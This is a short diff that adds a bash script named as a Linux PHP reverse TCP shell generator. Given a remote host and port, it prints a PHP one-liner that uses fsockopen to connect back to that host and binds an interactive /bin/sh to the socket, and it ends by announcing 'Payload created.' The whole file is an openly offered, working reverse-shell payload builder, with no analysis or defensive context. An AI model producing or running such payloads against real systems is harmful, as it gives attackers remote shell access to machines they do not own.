@@ -1,0 +1,21 @@
+#!/bin/bash
+
+function Craft_linux_php_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux php reverse tcp shell\n"
+                printf "Usage bash linux_php-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+	printf "php -r '\$sock=fsockopen(\"$rhost\",$rport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_php_reverse_shell "$1" "$2"
